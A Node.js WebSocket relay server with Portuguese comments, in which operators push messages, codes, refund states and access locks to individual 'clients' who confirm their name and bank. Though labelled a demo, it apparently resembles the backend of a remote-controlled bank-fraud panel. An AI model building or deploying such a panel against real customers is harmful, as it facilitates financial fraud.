const http = require('http');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws');

const PORT = process.env.PORT || 8787;
const PUBLIC_DIR = path.join(__dirname);

const MIME = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon'
};

const rooms = new Map();
const MAX_MESSAGES = 200;

function roomState(id) {
  if (!rooms.has(id)) {
    rooms.set(id, {
      clients: new Set(),
      clientInfo: new Map(),
      chat: new Map(),
      events: [],
      status: new Map()
    });
  }

  return rooms.get(id);
}

function safeString(value, max = 300) {
  return typeof value === 'string'
    ? value.slice(0, max)
    : '';
}


/* =========================================================
   LISTA DE CLIENTES CONFIRMADOS
========================================================= */

function getClientList(room) {
  const list = [];

  for (const socket of room.clients) {
    const info = room.clientInfo.get(socket);

    if (!info) continue;

    /*
      Operador não aparece como cliente.
      Cliente só aparece depois da confirmação.
    */

    if (info.role !== 'client') continue;
    if (!info.confirmed) continue;

    list.push({
      clientId: info.clientId,
      role: info.role,
      connectedAt: info.connectedAt,
      name: info.name || '',
      confirmed: true,
      online: socket.readyState === WebSocket.OPEN
    });
  }

  return list;
}


function broadcastClientList(room) {
  broadcast(room, {
    type: 'client_list',
    clients: getClientList(room)
  });
}


/* =========================================================
   ENVIA SOMENTE PARA UM CLIENTE
========================================================= */

function sendToClient(room, clientId, message) {
  if (!clientId) return false;

  for (const socket of room.clients) {
    const info = room.clientInfo.get(socket);

    if (!info) continue;

    if (
      info.clientId === clientId &&
      info.role === 'client' &&
      socket.readyState === WebSocket.OPEN
    ) {
      try {
        socket.send(JSON.stringify(message));
        return true;
      } catch (error) {
        return false;
      }
    }
  }

  return false;
}


/* =========================================================
   ENVIA PARA OS OPERADORES
========================================================= */

function sendToOperators(room, message) {
  const data = JSON.stringify(message);

  for (const socket of room.clients) {
    const info = room.clientInfo.get(socket);

    if (
      info &&
      info.role === 'operator' &&
      socket.readyState === WebSocket.OPEN
    ) {
      try {
        socket.send(data);
      } catch (error) {}
    }
  }
}


/* =========================================================
   BROADCAST
========================================================= */

function broadcast(room, message, except = null) {
  const data = JSON.stringify(message);

  for (const client of room.clients) {
    if (
      client !== except &&
      client.readyState === WebSocket.OPEN
    ) {
      try {
        client.send(data);
      } catch (error) {}
    }
  }
}


/* =========================================================
   SANITIZAÇÃO
========================================================= */

function sanitize(message) {
  if (!message || typeof message !== 'object') {
    return null;
  }

  const out = {
    type: safeString(message.type, 40)
  };


  /* =======================================================
     ENTRADA / IDENTIFICAÇÃO
  ======================================================= */

  if (message.type === 'client_info') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.name = safeString(
      message.name,
      150
    );

    return out;
  }


  /* =======================================================
     CONFIRMAÇÃO DO CLIENTE
  ======================================================= */

  if (message.type === 'demo_bank_confirmed') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.name = safeString(
      message.name,
      100
    );

    out.firstName =
      safeString(message.firstName, 100) ||
      safeString(
        out.name.split(/\s+/)[0],
        100
      );

    out.bank = safeString(
      message.bank,
      100
    );

    out.time =
      safeString(message.time, 40) ||
      new Date().toISOString();

    return out;
  }


  /* =======================================================
     CLIENTE APERTOU CONTINUAR
  ======================================================= */

  if (message.type === 'client_ready') {
    out.clientId = safeString(message.clientId, 100);
    out.name = safeString(message.name, 100);
    out.firstName =
      safeString(message.firstName, 100) ||
      safeString(out.name.split(/\s+/)[0], 100);
    out.time =
      safeString(message.time, 40) ||
      new Date().toISOString();
    return out;
  }

  /* =======================================================
     CHAT
  ======================================================= */

  if (message.type === 'chat') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.from =
      (
        message.from === 'operador' ||
        message.from === 'operator'
      )
        ? 'operador'
        : 'cliente';

    out.messages = Array.isArray(
      message.messages
    )
      ? message.messages
          .slice(-MAX_MESSAGES)
          .map(item => ({
            from:
              (
                item.from === 'operador' ||
                item.from === 'operator'
              )
                ? 'operador'
                : 'cliente',

            text: safeString(
              item.text,
              1000
            ),

            time: safeString(
              item.time,
              40
            )
          }))
      : [];

    out.cleared = !!message.cleared;

    return out;
  }


  /* =======================================================
     DEVOLUÇÃO
  ======================================================= */

  if (message.type === 'refund') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.status = safeString(
      message.status,
      40
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  /* =======================================================
     MENSAGEM DO OPERADOR
  ======================================================= */

  if (message.type === 'operator_message') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.message = safeString(
      message.message,
      2000
    );

    out.code = safeString(
      message.code,
      300
    );

    out.action = safeString(
      message.action,
      60
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  /* =======================================================
     ACESSO
  ======================================================= */

  if (message.type === 'client_access') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.locked = !!message.locked;

    out.action = safeString(
      message.action,
      60
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  if (message.type === 'access_state') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.state = safeString(
      message.state,
      60
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  /* =======================================================
     CONVÊNIO
  ======================================================= */

  if (message.type === 'convenio_state') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.state = safeString(
      message.state,
      60
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  /* =======================================================
     AÇÃO DO OPERADOR
  ======================================================= */

  if (message.type === 'operator_action') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.action = safeString(
      message.action,
      60
    );

    out.preview = safeString(
      message.preview,
      500
    );

    out.status = safeString(
      message.status,
      60
    );

    out.message = safeString(
      message.message,
      2000
    );

    out.code = safeString(
      message.code,
      300
    );

    out.state = safeString(
      message.state,
      60
    );

    out.locked = !!message.locked;

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  /* =======================================================
     RESET
  ======================================================= */

  if (message.type === 'client_reset') {
    out.clientId = safeString(
      message.clientId,
      100
    );

    out.reason = safeString(
      message.reason,
      200
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }


  /* =======================================================
     EVENTO
  ======================================================= */

  if (message.type === 'event') {
    out.event = safeString(
      message.event,
      100
    );

    out.clientId = safeString(
      message.clientId,
      100
    );

    out.at =
      Number(message.at) || Date.now();

    return out;
  }

  return null;
}


/* =========================================================
   SERVIDOR HTTP
========================================================= */

const server = http.createServer(
  (req, res) => {

    const reqPath =
      (req.url || '/').split('?')[0];

    if (reqPath === '/health') {

      res.writeHead(
        200,
        {
          'content-type':
            'application/json; charset=utf-8',

          'cache-control':
            'no-store'
        }
      );

      return res.end(
        JSON.stringify({
          ok: true,
          service:
            'public-demo-sync'
        })
      );
    }

    let relativePath =
      reqPath === '/'
        ? '/index.html'
        : reqPath;

    try {

      relativePath =
        decodeURIComponent(
          relativePath
        );

    } catch (error) {

      res.writeHead(400);

      return res.end(
        'Bad request'
      );
    }

    const filePath =
      path.normalize(
        path.join(
          PUBLIC_DIR,
          relativePath
        )
      );

    const safeRoot =
      path.resolve(
        PUBLIC_DIR
      ) + path.sep;

    const safeFile =
      path.resolve(
        filePath
      );

    if (
      safeFile.startsWith(
        safeRoot
      ) &&
      fs.existsSync(
        safeFile
      ) &&
      fs.statSync(
        safeFile
      ).isFile()
    ) {

      const extension =
        path.extname(
          safeFile
        ).toLowerCase();

      res.writeHead(
        200,
        {
          'content-type':
            MIME[extension] ||
            'application/octet-stream',

          'cache-control':
            'no-store'
        }
      );

      return fs
        .createReadStream(
          safeFile
        )
        .pipe(res);
    }

    res.writeHead(
      404,
      {
        'content-type':
          'text/plain; charset=utf-8'
      }
    );

    res.end(
      'Not found'
    );
  }
);


/* =========================================================
   WEBSOCKET
========================================================= */

const wss =
  new WebSocket.Server({
    server,
    path: '/ws'
  });


wss.on(
  'connection',
  socket => {

    let roomId = null;


    socket.on(
      'message',
      raw => {

        let message;

        try {

          message =
            JSON.parse(
              raw.toString()
            );

        } catch (error) {

          return;
        }


        /* =================================================
           ENTRAR NA SALA
        ================================================= */

        if (
          message.type === 'join'
        ) {

          roomId =
            safeString(
              message.room,
              100
            ) ||
            'demo-publico';

          const room =
            roomState(
              roomId
            );


          const clientId =
            safeString(
              message.clientId,
              100
            ) ||
            'cliente-' +
            Date.now().toString(36) +
            '-' +
            Math.random()
              .toString(36)
              .slice(2, 8);


          const role =
            message.role === 'operator'
              ? 'operator'
              : 'client';


          /* -----------------------------------------------
             Remove conexão anterior do mesmo ID
          ------------------------------------------------ */

          for (
            const oldSocket of room.clients
          ) {

            const oldInfo =
              room.clientInfo.get(
                oldSocket
              );

            if (
              oldInfo &&
              oldInfo.clientId === clientId &&
              oldSocket !== socket
            ) {

              room.clients.delete(
                oldSocket
              );

              room.clientInfo.delete(
                oldSocket
              );

              try {
                oldSocket.close();
              } catch (error) {}
            }
          }


          room.clients.add(
            socket
          );


          room.clientInfo.set(
            socket,
            {
              clientId,
              role,
              connectedAt:
                Date.now(),
              name: '',
              confirmed: false
            }
          );


          /* -----------------------------------------------
             Envia estado inicial somente para quem entrou
          ------------------------------------------------ */

          socket.send(
            JSON.stringify({
              type: 'state',

              chat: [],

              events:
                room.events,

              status:
                Object.fromEntries(
                  room.status
                ),

              clients:
                getClientList(
                  room
                )
            })
          );


          /*
             Importante:
             abrir a página NÃO coloca o cliente
             na lista da operadora.
          */

          broadcastClientList(
            room
          );

          return;
        }


        if (!roomId) {
          return;
        }


        const room =
          roomState(
            roomId
          );


        const clean =
          sanitize(
            message
          );


        if (!clean) {
          return;
        }


        /* =================================================
           CLIENTE ENVIOU NOME
        ================================================= */

        if (
          clean.type === 'client_info'
        ) {

          for (
            const socketItem of room.clients
          ) {

            const info =
              room.clientInfo.get(
                socketItem
              );

            if (
              info &&
              info.clientId ===
                clean.clientId
            ) {

              info.name =
                clean.name;

              /* A conexão da área do cliente já é o ponto
                 em que ele fica disponível para a operadora. */
              info.confirmed = true;

              break;
            }
          }

          broadcastClientList(
            room
          );

          return;
        }


        /* =================================================
           CLIENTE CONFIRMOU
        ================================================= */

        if (
          clean.type ===
          'demo_bank_confirmed'
        ) {

          let confirmedInfo = null;

          for (
            const socketItem of room.clients
          ) {

            const info =
              room.clientInfo.get(
                socketItem
              );

            if (
              info &&
              info.clientId ===
                clean.clientId
            ) {

              info.name =
                clean.name ||
                clean.firstName ||
                info.name;

              info.confirmed = true;

              confirmedInfo = info;

              break;
            }
          }


          const alreadyConfirmed = room.events.some(
            event =>
              event &&
              event.type === 'demo_bank_confirmed' &&
              event.clientId === clean.clientId &&
              event.time === clean.time
          );

          if (!alreadyConfirmed) {
            room.events.push(
              clean
            );

            if (
              room.events.length >
              100
            ) {
              room.events.shift();
            }

            /*
               Primeiro avisa os operadores
               que houve confirmação.
            */

            sendToOperators(
              room,
              clean
            );
          }


          /*
             Depois atualiza a lista.
             Agora o cliente aparece.
          */

          broadcastClientList(
            room
          );

          return;
        }


        /* =================================================
           CHAT
        ================================================= */

        if (
          clean.type === 'chat'
        ) {

          if (
            !room.chat.has(
              clean.clientId
            )
          ) {
            room.chat.set(
              clean.clientId,
              []
            );
          }


          if (clean.cleared) {

            room.chat.set(
              clean.clientId,
              []
            );

          } else {

            room.chat.set(
              clean.clientId,
              clean.messages
            );
          }


          const packet = {
            type: 'chat',

            clientId:
              clean.clientId,

            messages:
              room.chat.get(
                clean.clientId
              ) || [],

            from:
              clean.from,

            cleared:
              clean.cleared
          };


          if (
            clean.from === 'cliente'
          ) {

            sendToOperators(
              room,
              packet
            );

          } else {

            sendToClient(
              room,
              clean.clientId,
              packet
            );
          }

          return;
        }


        /* =================================================
           CLIENTE APERTOU CONTINUAR
        ================================================= */

        if (clean.type === 'client_ready') {

          for (const socketItem of room.clients) {
            const info = room.clientInfo.get(socketItem);
            if (info && info.clientId === clean.clientId) {
              info.confirmed = true;
              info.name = clean.name || clean.firstName || info.name;
              break;
            }
          }

          /*
             Alguns navegadores móveis podem entregar o pacote
             client_ready antes do pacote demo_bank_confirmed.
             Para a operadora, os dois significam a mesma coisa:
             o cliente terminou o preenchimento e apertou CONTINUAR.
             Portanto, convertemos aqui o client_ready em uma
             confirmação completa para a tela da operadora.
          */
          const confirmation = {
            type: 'demo_bank_confirmed',
            clientId: clean.clientId,
            name: clean.name || clean.firstName || 'Cliente',
            firstName: clean.firstName || clean.name || 'Cliente',
            time: clean.time || new Date().toISOString()
          };

          const alreadyConfirmed = room.events.some(
            event =>
              event &&
              event.type === 'demo_bank_confirmed' &&
              event.clientId === confirmation.clientId &&
              event.time === confirmation.time
          );

          if (!alreadyConfirmed) {
            room.events.push(confirmation);
            if (room.events.length > 100) {
              room.events.shift();
            }
          }

          sendToOperators(room, confirmation);
          broadcastClientList(room);
          return;
        }


        /* =================================================
           DEVOLUÇÃO
        ================================================= */

        if (
          clean.type === 'refund'
        ) {

          room.status.set(
            clean.clientId,
            clean.status
          );


          sendToClient(
            room,
            clean.clientId,
            clean
          );


          sendToOperators(
            room,
            clean
          );

          return;
        }


        /* =================================================
           MENSAGEM DO OPERADOR
        ================================================= */

        if (
          clean.type ===
          'operator_message'
        ) {

          sendToClient(
            room,
            clean.clientId,
            clean
          );

          return;
        }


        /* =================================================
           ACESSO / BLOQUEIO
        ================================================= */

        if (
          clean.type ===
            'client_access' ||
          clean.type ===
            'access_state'
        ) {

          sendToClient(
            room,
            clean.clientId,
            clean
          );

          return;
        }


        /* =================================================
           CONVÊNIO
        ================================================= */

        if (
          clean.type ===
          'convenio_state'
        ) {

          sendToClient(
            room,
            clean.clientId,
            clean
          );

          return;
        }


        /* =================================================
           AÇÃO DO OPERADOR
        ================================================= */

        if (
          clean.type ===
          'operator_action'
        ) {

          /*
             A ação vai SOMENTE para o cliente
             selecionado na operadora.
          */

          sendToClient(
            room,
            clean.clientId,
            clean
          );

          return;
        }


        /* =================================================
           RESET
        ================================================= */

        if (
          clean.type ===
          'client_reset'
        ) {

          sendToClient(
            room,
            clean.clientId,
            clean
          );

          return;
        }


        /* =================================================
           OUTROS EVENTOS
        ================================================= */

        sendToOperators(
          room,
          clean
        );

      }
    );


    /* =====================================================
       DESCONECTOU
    ===================================================== */

    socket.on(
      'close',
      () => {

        if (
          roomId &&
          rooms.has(roomId)
        ) {

          const room =
            rooms.get(
              roomId
            );


          room.clients.delete(
            socket
          );

          room.clientInfo.delete(
            socket
          );


          broadcastClientList(
            room
          );


          /*
             Mantém a sala enquanto ainda
             existir alguém conectado.
          */

          if (
            room.clients.size === 0
          ) {

            rooms.delete(
              roomId
            );

          }

        }

      }
    );

  }
);


/* =========================================================
   INICIAR SERVIDOR
========================================================= */

server.listen(
  PORT,
  '0.0.0.0',
  () => {

    console.log(
      `Public demo sync listening on ${PORT}`
    );

  }
);